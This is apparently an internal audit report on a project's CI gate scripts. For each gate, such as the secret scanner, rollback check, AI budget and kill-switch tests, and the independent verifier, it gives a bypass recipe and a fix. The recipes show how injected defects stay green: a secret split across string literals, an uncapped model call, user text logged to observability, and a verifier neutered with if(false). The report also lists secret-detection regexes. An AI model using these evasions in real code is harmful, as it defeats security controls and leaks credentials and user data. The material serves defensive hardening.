Kein PROMPT_VERSION-Bump, kein --attest, Lock unverändert. Gleiche Lücke gilt für `+ variable`, `.concat(...)`, angehängtes weiteres Literal; invers erfasst der Regex auch keinen Prompt in anderer Form (z. B. export const SYSTEM = SYSTEM_BASE;).

FIX: Nicht mehr den Quelltext regex-scrapen, sondern den TATSÄCHLICHEN Laufzeitwert der Exporte hashen — dann ist jede Konkatenation/Variable/Concat automatisch erfasst.

Robuster Fix in extract():
- Modul zur Build-/Gate-Zeit laden und die echten Strings hashen, z. B. via esbuild/tsx transpile + dynamischer Import:
    const mod = await import(pathToFileURL(SRC)); // ggf. über transpile-Step
    const blocks = [mod.SYSTEM, mod.INTERNAL_TEMPLATE];
    const ver = mod.PROMPT_VERSION;
    const hash = sha256(blocks.join("\n---\n"));
  So wird `+ Literal`, `+ variable`, `.concat(...)`, `= SYSTEM_BASE` alles korrekt gehasht.

Falls kein Modul-Import gewünscht ist, zusätzlich fail-closed per AST (z. B. @typescript-eslint/parser oder acorn): Zuweisung an SYSTEM/INTERNAL_TEMPLATE MUSS ein einzelnes TemplateLiteral OHNE `expressions` und OHNE umgebende Operatoren sein; jede BinaryExpression (`+`), CallExpression (`.concat`) oder Identifier-RHS -> Exit≠0 ("Prompt darf nur als bare Template-Literal definiert werden"). Das schließt auch die inverse Lücke (`= SYSTEM_BASE`).

Zusätzlich: `--selftest` muss die ECHTE Datei prüfen (nicht nur einen Hardcode-Seed), und in ci.yml sollte prompt-lifecycle.mjs im Standardmodus (ohne `--selftest`) als eigener Gate-Schritt laufen, damit die reale Lock-Prüfung erzwungen ist.

---
## rollback-check (scripts/regime/rollback-check.mjs) [high]

RECIPE: Der Check ist ein reiner Token-Presence-Scan: checkRollback() (Z.22-32) prüft nur, ob 5 literale Substrings IRGENDWO in rollback.sh/deploy.sh vorkommen — keine semantische Verdrahtung, kein Test-File, nur ein trivialer --selftest-Seed (Z.43). Bypass: deploy/rollback.sh so ersetzen, dass jede Invariante ECHT kaputt ist, die Tokens aber in Kommentaren/No-op-Zeilen überleben: (1) `curl -sf \"$HEALTH_URL\" ... || true` -> Health-Ergebnis verworfen, Erfolg wird IMMER gemeldet (kein Gate); (2) `--dry-run` nie geparst -> jeder Aufruf mutiert real (destruktiver Drill); (3) `date +%s` nur im Kommentar -> kein Timing; (4) `pre-deploy-*.db` nur im Kommentar -> kein DB-Restore; (5) `podman image exists ...:previous ... || true` -> Vorbedingung nicht erzwungen. Realer Lauf: `node scripts/regime/rollback-check.mjs` -> EXIT=0, 'Grün'; `--selftest` bleibt ebenfalls grün. Danach `git checkout deploy/rollback.sh`. Fix: Verdrahtung asserten (curl-Ergebnis muss in fail/branch fließen, --dry-run muss geparst werden, cp \"$BACKUP\" app.db muss existieren) oder Skript unter gestubbtem podman/curl ausführen und Verhalten prüfen (rote Health -> Exit!=0; --dry-run -> kein podman tag).

FIX: Stop scanning for token presence and instead assert real wiring, or better, execute the script under stubs and observe behavior. Concrete options: (A) Behavioral harness (strongest): run `deploy/rollback.sh` with `podman`/`curl`/`podman-compose` replaced by stubs on PATH and assert observable effects — a stub `curl` returning non-zero (red health) MUST make the script exit != 0; `--dry-run` MUST produce zero `podman tag`/`podman start`/`cp` side effects (verify via a call-log written by the stubs); precondition: with `podman image exists` stubbed to fail, the script MUST abort with exit != 0; `--with-db` MUST perform a `cp "$BACKUP" .../app.db`. (B) If keeping static analysis, assert semantic structure, not substrings: the curl result must feed a branch/fail (e.g. reject `curl -sf "$HEALTH_URL"[^\n]*\|\|[ ]*true` and require it inside an `if`/loop that gates the final exit), require an actual `cp "$BACKUP" "$DATA_DIR/app.db"` line (not just the glob in a comment), require a real `--dry-run) DRY=1` parse in the arg loop, and strip comments before matching so tokens in `#`-lines don't count. Additionally, extend --selftest with a positive-attack fixture: a script that keeps all 5 tokens only in comments/`|| true` lines MUST be rejected — that fixture currently passes and exposes the gap.

---
## ai-killswitch (tests/ai-killswitch.test.ts) — A-34 Kill-Switch / B-28 Auto-Halt / B-07 Token-Log ohne Inhalt [high]

RECIPE: Die B-07-Prüfung ist Fake-Grün: sie fängt nur den künstlichen Seed, nicht den realen Defekt.

Fangregel im Test (3. it-Block): Es wird NUR `recordAiUsage({input_tokens:123, output_tokens:456})` isoliert aufgerufen und danach geprüft `JSON.stringify(rows) not toContain "egal"`. Der reale Inhalts-Leck-Pfad — der Erfolgspfad von `generateRecipeDraft`, wo tatsächlich Ausgangstext/KI-Antwort vorliegt — wird NIE ausgeführt: im 1. it-Block ist das Feature `off`, also bricht `generateRecipeDraft("egal")` sofort mit code "disabled" ab, bevor irgendetwas geloggt wird. "egal" erreicht daher keinen Log. Der Content-Check ist an ein Literal ("egal") gebunden, das im geprüften Pfad gar nicht durchläuft.

Reproduzierter echter Defekt (in src/lib/ai-recipe.ts, direkt nach `recordAiUsage(res.usage)` eingefügt, plus `import { recordOpsEvent } from "./observability";`):
  recordOpsEvent({ kind:"request", route:"ai/recipe",
    detail: `debug src=${sourceText} out=${res.parsed_output?.title ?? ""}` });
Das schreibt Ausgangstext UND generierten Titel im Klartext ins ops_event — exakt die B-07-Verletzung, die die Kontrolle fangen soll (Datenschutz-Leck in den Observability-Store, 90 Tage Retention).

Gate real ausgeführt:
- Baseline `npx vitest run tests/ai-killswitch.test.ts`: 3 passed.
- Mit injiziertem Inhalts-Leck: 3 passed (unverändert grün).
Danach `git checkout src/lib/ai-recipe.ts` — Repo wiederhergestellt, git status sauber.

Ergebnis: Ein realer, produktiver B-07-Inhalts-Leck kommt ungehindert durch die Kontrolle.

FIX: Exercise the real success path and assert against it. Reuse the mocked-SDK harness already present in tests/ai-recipe.integration.test.ts: after `const draft = await generateRecipeDraft("Zucchini, Feta, Ofen, 30 Min")`, query the store and assert no content leaked, e.g.: `const { db, schema } = await import("@/db"); const hay = JSON.stringify(await db.select().from(schema.opsEvent)); expect(hay).not.toContain("Zucchini"); // Ausgangstext expect(hay).not.toContain("Ofengemüse"); // generierter Titel`. With the leak injected this fails; clean it passes. The assertion must use a sentinel that actually flows through the executed success path (source text + generated title), not a literal only present on the disabled/abort path. Optionally also add a static regime scan flagging any recordOpsEvent/logJson call in the ai path whose detail interpolates sourceText/parsed_output/userText.

---
## llm-matrix-check (scripts/regime/llm-matrix-check.mjs) — C-05 LLM-Risiko-Matrix-Gate [medium]

RECIPE: Die Fangregel prüft in validate() nur, ob die Strings `c.control` und `c.test` nach .trim() length>0 haben. Sie prüft NIEMALS, ob der referenzierte Test/die Kontrolle real existiert oder inhaltlich etwas testet. Damit kommt ein ECHTER Defekt genau dieser Klasse durch:

1) Phantom-Test: `governance/llm-risk-matrix.json` -> categories.unbounded_consumption.test = "tests/does-not-exist.budget.test.ts". Diese Datei existiert nicht (mit `ls` verifiziert: No such file or directory) -> die Zelle hat faktisch KEINEN Test = "Kontrolle ohne Test", exakt das, was der Kommentar 'ein Befund im Kostüm' zu fangen verspricht.

2) Platzhalter-Zelle: categories.improper_output_handling.control = "TODO", .test = "TODO". Weder Kontrolle noch Test existieren real = leere Zelle.

Beide Manipulationen zusammen eingespielt: `node scripts/regime/llm-matrix-check.mjs` -> Ausgabe "10 Kategorien, jede mit Kontrolle + Test. Grün." EXIT=0. Danach `git checkout governance/llm-risk-matrix.json` (Repo sauber).

Weitere Regex-freie Varianten die durchkommen: "n/a", "siehe oben", "-", "TBD", ein Leerzeichen-umschlossenes "." etc. — jeder nicht-leere String genügt.

FIX: In validate() jeden control/test-Eintrag tokenisieren (Split an '+' und Whitespace). Fuer pfad-artige Tokens (enthalten '/' oder Endung .mjs/.ts) fs.existsSync(path.join(ROOT, token)) erzwingen -> nicht existent = Befund. Eine Placeholder-Denylist (TODO, TBD, N/A, n/a, '-', '.', 'siehe oben', 'TBA') case-insensitive ablehnen. Verlangen, dass jede Zelle mindestens ein real existierendes Datei-Token traegt (oder eine explizite na_reason). Zusaetzlich --selftest um einen Phantom-Pfad-Fall erweitern (z.B. broken.categories.X.test='tests/phantom.test.ts'), damit die Regression selbst gegated ist. Beispiel-Snippet fuer die Kern-Pruefung: const tokens = String(c.test).split(/[+\s]+/).filter(Boolean); const paths = tokens.filter(t => t.includes('/') || /\.(mjs|ts)$/.test(t)); for (const p of paths) if (!fs.existsSync(path.join(ROOT, p))) errors.push(`${cat}: Test referenziert nicht existente Datei ${p}.`); if (!paths.length) errors.push(`${cat}: Test ohne real existierende Datei (Platzhalter?).`).

---
## ai-budget-check [high]

RECIPE: Der Check (scripts/regime/ai-budget-check.mjs) liest NUR src/lib/ai-recipe.ts und prueft file-global per Regex /max_tokens\s*:/ und /timeout\s*:/, ob beide Strings IRGENDWO in der Datei vorkommen — er bindet die Caps an keinen konkreten Aufruf. Bypass: eine zweite, echt unbegrenzte KI-Generierung in dieselbe Datei einfuegen, z. B. `const client = new Anthropic({ apiKey }); await client.messages.create({ model: "claude-opus-4-8", messages: [...] });` (KEIN max_tokens, KEIN timeout, kein maxRetries). Das Gate bleibt gruen (EXIT=0), weil der bestehende erste parse-Aufruf weiterhin `max_tokens: 8000` und der bestehende Client `timeout: 90_000` liefert und damit beide file-globalen Regexe erfuellt — obwohl der neue Aufruf real unbegrenzt Tokens/Zeit ziehen kann. Real ausgefuehrt: baseline gruen, mit injiziertem unbegrenzten Aufruf ebenfalls gruen, danach `git checkout src/lib/ai-recipe.ts`. Zusatzluecke: jeder KI-Aufruf in einer ANDEREN Datei (z. B. src/lib/ai-recipe-jobs.ts, Route-Handler, neue Module) wird gar nicht gescannt. Fake-Gruen zusaetzlich im --selftest: er prueft nur einen hartkodierten Seed-String, nie die reale Datei; solange irgendwo beide Substrings stehen, kann der Selbsttest nie fehlschlagen.

FIX: Replace the file-global substring test with per-call-site enforcement across all of src/. Concretely: (a) glob every src/**/*.ts{,x} file rather than a single hardcoded path; (b) parse the source (TS AST via typescript/@babel, or ts-morph) and, for each `new Anthropic(...)` expression, assert its options object literal contains a numeric `timeout` (and ideally `maxRetries`); for each `client.messages.create/parse/stream(...)` call, assert the argument object literal contains a numeric `max_tokens`. Fail if any call site lacks its cap. A regex-only version is fragile but should at minimum match on individual call expressions (e.g. capture each `messages.(create|parse|stream)(` ... matching brace block and require `max_tokens:` inside that block, and each `new Anthropic(` block and require `timeout:` inside it) instead of testing the whole file. (c) Make --selftest run the real check() against a temp fixture file that contains an uncapped call and assert it fails, plus a capped fixture that passes — not a hardcoded string that bypasses the file-scanning logic entirely.

---
## independent-verify (scripts/regime/independent-verify.mjs) [medium]

RECIPE: Die einzige Selbstintegritaets-/Fangregel des Controls ist der --selftest (Zeilen 36-44). Er ist wirkungslos: er loescht nur SECOND_VENDOR_API_KEY aus der Umgebung, bestaetigt das und exit 0. Er ruft weder diff(), noch die API, noch die eigentliche Block/Pass-Entscheidung (Zeilen 82-88) auf. Damit kann keine reale Fake-Green-Manipulation der Entscheidung erkannt werden.

Nachweis (git-restauriert danach): Einzeilen-Defekt in Zeile 84, `if (v.refuted && v.confidence === "high")` -> `if (false)`, macht den Verifier zur bedingungslosen Fake-Green.
- Gegen lokalen Fake-Vendor (liefert refuted=true confidence=high): ehrlicher Code exit 1 (blockt), Defekt exit 0 (passt durch) bei identischem Log `refuted=true confidence=high` -> echter Verhaltenswechsel, kein No-op.
- Trotzdem bleiben alle Waechter gruen: `independent-verify.mjs --selftest` exit 0, Realer Lauf (ohne Key) exit 0, `calibration/inject.mjs` exit 0.

Strukturell gibt es keinen weiteren Faenger: independent-verify ist NICHT in ci.yml verdrahtet (grep-count 0), NICHT im Kalibrier-Korpus seeds.json, und gate-selftest.mjs deckt es nicht ab. Die vom Control benannte Klasse (Fake-Green des Verifiers, mit/ohne Key) wird von KEINER Kontrolle, auch nicht von sich selbst, gefangen.

Zusaetzliche latente Fake-Greens im ausgelieferten Code (ohne Injection): Zeile 84 blockt nur bei confidence==="high" -> ein Fremd-Vendor mit refuted=true/confidence="medium" fuer einen realen, benannten Defekt kommt gruen durch; Zeile 82 JSON.parse(... ?? "{}") failt-open, eine Antwort ohne Feld refuted -> undefined -> falsy -> gruen.

FIX: Give the control a real behavioral self-integrity test and close the two fail-opens:

1) Extract the pass/block decision into a pure, testable function, e.g. `export function decide(v){ if (!v || typeof v.refuted !== "boolean") return {block:true, reason:"unparsable/missing refuted -> fail-closed"}; if (v.refuted && v.confidence !== "low") return {block:true, reason:v.reason}; return {block:false}; }`. This fixes line 82 (fail-closed on missing/unparsable field) and line 84 (block on medium+high, not only high).

2) Rewrite --selftest to actually exercise decide(): assert decide({refuted:true,confidence:"high"}).block===true, decide({refuted:true,confidence:"medium"}).block===true, decide({}).block===true (fail-closed), and decide({refuted:false}).block===false. exit 1 if any assertion fails. This makes the line-84->if(false) manipulation (and the fail-opens) caught by the control's own --selftest.

3) Wire it into the calibration corpus: add a seed in scripts/regime/calibration/seeds.json whose control_cmd is `node scripts/regime/independent-verify.mjs --selftest`, so inject.mjs --strict (already in ci.yml) freezes releases if the verifier's decision self-test regresses. Optionally add the same assertion to gate-selftest.mjs.

4) Make the independent-verify.yml workflow a required check and fail-closed when the key is present (already does) so an activated verifier that is silently neutered is detectable.

---
## secret-scan (scripts/regime/secret-scan.mjs) [high]

RECIPE: Scanner matches four narrow regexes line-by-line. Two real defects pass: (1) Split a valid secret across string literals so no single-line run matches, e.g. `const k = "sk-ant-api03-" + "9fJ2kLmN0pQrStUvWxYz1aBcDeFgHiJkLmNoPqRsTuVwXyZ"; ` — runtime rebuilds the full working Anthropic key, but the 24-char run after `sk-ant-` is broken. The identical key as ONE single-line literal IS caught (verified exit 1), and --selftest only seeds that naive form, so calibration stays green. (2) Store any secret whose format isn't sk-ant/AKIA/PEM under a variable/property name lacking the magic keywords `secret|token|api_key|password`, e.g. `export const mailer = { pass: "SG.aBcDeFgHiJkLmNoPqRsTu.wXyZ0123456789AbCdEfGhIjKlMnOpQrStUvWxYz01234" };` — the Generic-Token pattern needs a keyword on the same line, so real SendGrid/Stripe(sk_live_)/GitHub(ghp_)/Slack(xoxb-)/Google(AIza) keys walk through. Both files were git-added and the gate returned exit 0 "Grün"; repo restored afterward.

FIX: Two independent hardenings in scripts/regime/secret-scan.mjs:

1) Defeat literal-splitting: scan on a normalized copy where adjacent string-literal concatenations are collapsed before matching, e.g. before the per-line loop do
   const normalized = text.replace(/["']\s*\+\s*["']/g, "");
   and run the sk-ant/AKIA/PEM patterns against the normalized text (or full-file with /m off) so `"sk-ant-api03-" + "9fJ2..."` becomes one contiguous run. Keep line numbers by mapping, or just report file-level for the high-entropy patterns.

2) Close the keyword-gated Generic-Token gap by adding prefix-anchored patterns that fire regardless of the surrounding variable name:
   - SendGrid: /\bSG\.[A-Za-z0-9_-]{16,}\.[A-Za-z0-9_-]{16,}/
   - Stripe live: /\bsk_live_[A-Za-z0-9]{20,}/
   - GitHub PAT: /\bghp_[A-Za-z0-9]{36}/ (and gho_/ghu_/ghs_/ghr_)
   - Slack: /\bxox[baprs]-[A-Za-z0-9-]{10,}/
   - Google API: /\bAIza[A-Za-z0-9_-]{35}/
   Additionally add a high-entropy fallback: flag any quoted literal of length >= 32 whose Shannon entropy > ~4.0 bits/char, with an allowlist comment escape hatch (secret-scan-allow) to control false positives.

3) Fix calibration so the gap cannot silently reopen: extend --selftest to seed the SPLIT form ("sk-ant-" + "..."), a SendGrid/Stripe/ghp key under a non-magic property name, and assert each is detected — mirroring the two live defects. A selftest that only seeds the naive single-literal sk-ant form is calibration theater.

---
